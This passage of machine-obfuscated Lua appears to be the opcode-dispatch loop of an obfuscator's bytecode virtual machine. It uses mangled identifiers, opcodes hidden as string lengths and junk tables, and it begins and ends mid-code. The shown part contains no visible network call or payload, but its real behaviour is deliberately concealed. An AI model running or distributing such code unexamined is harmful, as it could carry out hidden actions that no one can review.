a_lllIIlIllIlIllllIIlIIlll[#("6A")]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IIIlIllIllllIIllIlllIIll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("OTR")]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Bq")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("cro")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("7op6")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("sZ")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("Tan")]];else ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("lO")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Rmr")]][ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("bGQN")]]];end;elseif ajefa_IIIlIllIllllIIllIlllIIll<=#("2xUcsEudfMTnG4FGoc1z1uKryVfTrtilBGzHSXxtvZT8NfGJKdQRICxHWCOHyLWVDIX")then if ajefa_IIIlIllIllllIIllIlllIIll<=#("G7XCPHdcLLOspGjnNCN8i1Vpi05Ud7GfsGdNqobazu5lYur1CIia4Y0")then if ajefa_IIIlIllIllllIIllIlllIIll<=#("mHsZLt9OfJaTDG7zANKY5JCXJerFZFkEQyAT5mzeurfouIy5L")then if ajefa_IIIlIllIllllIIllIlllIIll<=#("KrocTNfFqHcFZKyHdegnDnnFDNEmDaQv3e53oNOXOA61c0")then if ajefa_IIIlIllIllllIIllIlllIIll==#("F1YEtZxqxdTJgj2cp1QLUPFrAAtKcqxDMk8vPHxGHYJZF")then do return end;else ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("xb")]]=ajefa_lIIIllIlIIIIIllIlII(ajefa_lllIlllllIIlI[ajefa_lllIIlIllIlIllllIIlIIlll[#("vPH")]],nil,ajefa_IlIIllIIIl);end;elseif ajefa_IIIlIllIllllIIllIlllIIll<=#{"1 + 1 = 111";"1 + 1 = 111";{336;242;195;500};"1 + 1 = 111";{248;588;471;447};{403;614;563;835};"1 + 1 = 111";"1 + 1 = 111";{16;222;388;552};{471;40;238;193};"1 + 1 = 111";"1 + 1 = 111";{813;709;495;834};{416;250;509;207};"1 + 1 = 111";{298;349;366;554};"1 + 1 = 111";{314;339;520;213};{950;212;601;829};"1 + 1 = 111";{603;713;987;746};{377;535;840;766};"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";{660;550;3;889};"1 + 1 = 111";"1 + 1 = 111";{186;881;291;43};{528;204;705;331};{436;306;439;63};{287;257;959;157};{980;591;228;220};"1 + 1 = 111";{435;697;508;421};{81;405;92;370};{519;740;128;571};"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";{622;176;386;796};"1 + 1 = 111";"1 + 1 = 111";}then ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("G9")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("PHd")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("6x05")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{{616;878;57;518};"1 + 1 = 111";}]]=ajefa_IllIllll[ajefa_lllIIlIllIlIllllIIlIIlll[#("e74")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("fm")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("hro")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("0JGm")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Sf")]]=ajefa_IllIllll[ajefa_lllIIlIllIlIllllIIlIIlll[#("jMZ")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("RJ")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("rIk")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("2UdR")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("o0")]]=ajefa_IllIllll[ajefa_lllIIlIllIlIllllIIlIIlll[#("B1s")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("On")]][ajefa_lllIIlIllIlIllllIIlIIlll[#{{956;102;520;230};"1 + 1 = 111";{545;844;502;739};}]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("UNr1")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("gC")]]=ajefa_IllIllll[ajefa_lllIIlIllIlIllllIIlIIlll[#("ltj")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("NU")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("BEQ")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("U32A")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("cy")]]=ajefa_IllIllll[ajefa_lllIIlIllIlIllllIIlIIlll[#("P9B")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("n5")]][ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";}]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("mQ3u")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("VV")]]=ajefa_IllIllll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Vpn")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";}]][ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";{692;292;174;613};"1 + 1 = 111";}]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("umTZ")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("N0")]]=ajefa_IllIllll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Fk9")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("TT")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("odT")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("8Shp")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("NM")]]=(ajefa_lllIIlIllIlIllllIIlIIlll[#("qUG")]~=0);ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IllIllll[ajefa_lllIIlIllIlIllllIIlIIlll[#("iOH")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("C7")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_lllIIlIllIlIllllIIlIIlll[#("5SV")];elseif ajefa_IIIlIllIllllIIllIlllIIll==#("9TJDiogNDoa8GllWTQTSb08KFujLDcGnqbkuxNHIoomKOM05")then local ajefa_lIIllIlIIlllII=ajefa_lllIIlIllIlIllllIIlIIlll[#("aT")];local ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lIlllIll[ajefa_lIIllIlIIlllII+2];local ajefa_IlIIllIIIl=ajefa_lIlllIll[ajefa_lIIllIlIIlllII]+ajefa_IIIlIllIllllIIllIlllIIll;ajefa_lIlllIll[ajefa_lIIllIlIIlllII]=ajefa_IlIIllIIIl;if(ajefa_IIIlIllIllllIIllIlllIIll>0)then if(ajefa_IlIIllIIIl<=ajefa_lIlllIll[ajefa_lIIllIlIIlllII+1])then ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_lllIIlIllIlIllllIIlIIlll[#("gf7")];ajefa_lIlllIll[ajefa_lIIllIlIIlllII+3]=ajefa_IlIIllIIIl;end elseif(ajefa_IlIIllIIIl>=ajefa_lIlllIll[ajefa_lIIllIlIIlllII+1])then ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_lllIIlIllIlIllllIIlIIlll[#("I1o")];ajefa_lIlllIll[ajefa_lIIllIlIIlllII+3]=ajefa_IlIIllIIIl;end else local ajefa_IlIIIlIIIIlIIlllI;local ajefa_IIIlIllIllllIIllIlllIIll;ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("9A")];ajefa_IlIIIlIIIIlIIlllI=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("dLW")]];ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll+1]=ajefa_IlIIIlIIIIlIIlllI;ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_IlIIIlIIIIlIIlllI[ajefa_lllIIlIllIlIllllIIlIIlll[#("aGZJ")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("io")]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll+1])ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("3d")]]=(ajefa_lllIIlIllIlIllllIIlIIlll[#("cvf")]~=0);ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("zE")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("E22")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("d5")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("pNY")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("bEr")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("pU")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Ab")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("TIj")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Ty")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("f8R")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Ua")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("nfo")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("mlJV")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("fK")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("ZaU")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("zoZF")]];end;elseif ajefa_IIIlIllIllllIIllIlllIIll<=#("QztAUCjV97XeGkBSWREb1zgjkDXOy53FoBWNmYGKaKxPTDTeW114")then if ajefa_IIIlIllIllllIIllIlllIIll<=#("3srskorOFxder0eyXG8l4arbBASTT2He8juhFubJn5FmsLCMPQ")then ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Xn")]]=ajefa_lIIIllIlIIIIIllIlII(ajefa_lllIlllllIIlI[ajefa_lllIIlIllIlIllllIIlIIlll[#("7kW")]],nil,ajefa_IlIIllIIIl);elseif ajefa_IIIlIllIllllIIllIlllIIll==#("v3SB2bp2VHI5N09fiF63DEz78FeS08fec3kkqSCfoDqcQa1xtFs")then local ajefa_lIIllIlIIlllII=ajefa_lllIIlIllIlIllllIIlIIlll[#("UW")];local ajefa_IlIIllIIIl=ajefa_lIlllIll[ajefa_lIIllIlIIlllII]local ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lIlllIll[ajefa_lIIllIlIIlllII+2];if(ajefa_IIIlIllIllllIIllIlllIIll>0)then if(ajefa_IlIIllIIIl>ajefa_lIlllIll[ajefa_lIIllIlIIlllII+1])then ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_lllIIlIllIlIllllIIlIIlll[#("Irl")];else ajefa_lIlllIll[ajefa_lIIllIlIIlllII+3]=ajefa_IlIIllIIIl;end elseif(ajefa_IlIIllIIIl<ajefa_lIlllIll[ajefa_lIIllIlIIlllII+1])then ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_lllIIlIllIlIllllIIlIIlll[#{{511;147;567;140};"1 + 1 = 111";{731;233;331;312};}];else ajefa_lIlllIll[ajefa_lIIllIlIIlllII+3]=ajefa_IlIIllIIIl;end else ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Hv")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("qt3")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("dFAJ")];end;elseif ajefa_IIIlIllIllllIIllIlllIIll<=#("SWG1EVDy7HcXBE2UPYZAd0O9nvr8NRzuP8xpxsRFpeiRBDMlhhRFP")then ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("DT")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";{150;331;134;591};{297;456;337;826};}]];elseif ajefa_IIIlIllIllllIIllIlllIIll==#("d1iGOhDEUpiRhCgMxxhtk8S6JUUf0Ga4PW4Gh1PJcVu2JTvjfGUuxv")then if(ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("yu")]]<ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("kQl1")]])then ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;else ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_lllIIlIllIlIllllIIlIIlll[#("Bip")];end;else ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";{23;935;574;50};{77;559;887;578};}];end;elseif ajefa_IIIlIllIllllIIllIlllIIll<=#("fil63xxNopncvILEGRJrzOZyZzLauVPItdZx64WlPhgNvR9LEboNYdsCtYgEW")then if ajefa_IIIlIllIllllIIllIlllIIll<=#("rDKQSrSoIL5xMqHmbiA9HtGbUpVychXsAsZNcP8S3oDOSBCb4hW8eWZ87I")then if ajefa_IIIlIllIllllIIllIlllIIll<=#("DHulBYN7tB4jvjRgr12ssYTD5vYnOD1QFTGlIdcZfEiLa7AZxPIgeoNP")then ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("bJ")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("OFW")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("Pbo9")]];elseif ajefa_IIIlIllIllllIIllIlllIIll>#("1pe9zt0KnPNNGIoZcnZQiD859185VLpf1yRX70RkraWsXl0hsrbbY9Pyr")then do return end;else local ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lllIIlIllIlIllllIIlIIlll[#("Bm")]local ajefa_lIIllIlIIlllII,ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_llIIllIIIIlI(ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll](ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll+1]))ajefa_lIIIIIlIllIlllllllIIll=ajefa_IlIIIlIllIlIlllIlIlIllll+ajefa_lllIIlIllIlIllllIIlIIlll-1 local ajefa_IlIIIlIllIlIlllIlIlIllll=0;for ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lllIIlIllIlIllllIIlIIlll,ajefa_lIIIIIlIllIlllllllIIll do ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll]=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];end;end;elseif ajefa_IIIlIllIllllIIllIlllIIll<=#("aHu5YNAHWi1C1mGPyhRPiXb1MDJnr2SsFX0jZxmi3pARp1BZGjLIRNbmGEs")then local ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_lllIIlIllIlIllllIIlIIlll[#("fK")]ajefa_lIlllIll[ajefa_IlIIIlIllIlIlllIlIlIllll]=ajefa_lIlllIll[ajefa_IlIIIlIllIlIlllIlIlIllll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IlIIIlIllIlIlllIlIlIllll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("2iQ")]))elseif ajefa_IIIlIllIllllIIllIlllIIll>#("dlo3BI6dxvZb5JW2ytLVcUSirjM2WNOud0eSaHpS5xCjtJNi0iYm3IttDgMq")then if not ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Bp")]]then ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;else ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_lllIIlIllIlIllllIIlIIlll[#("SFK")];end;else local ajefa_lIIIllIlIIIIIllIlII;local ajefa_lIIIIIlIllIlllllllIIll;local ajefa_IllIllll;local ajefa_IIIlIllIllllIIllIlllIIll;ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#{{727;114;813;742};"1 + 1 = 111";}];ajefa_IllIllll=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("vhY")]];ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll+1]=ajefa_IllIllll;ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_IllIllll[ajefa_lllIIlIllIlIllllIIlIIlll[#("bFbn")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("sY")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("5ni")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("zL")]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IIIlIllIllllIIllIlllIIll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("mkX")]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("7t")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("boo")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("ndsJ")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("DS")];ajefa_IllIllll=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("4Ri")]];ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll+1]=ajefa_IllIllll;ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_IllIllll[ajefa_lllIIlIllIlIllllIIlIIlll[#("bghl")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("Z7")]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll+1])ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Kv")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("pYz")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";{281;496;636;377};}];ajefa_IllIllll=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("xXL")]];ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll+1]=ajefa_IllIllll;ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_IllIllll[ajefa_lllIIlIllIlIllllIIlIIlll[#("gyoR")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("BO")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("Ocv")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("nS")]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IIIlIllIllllIIllIlllIIll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 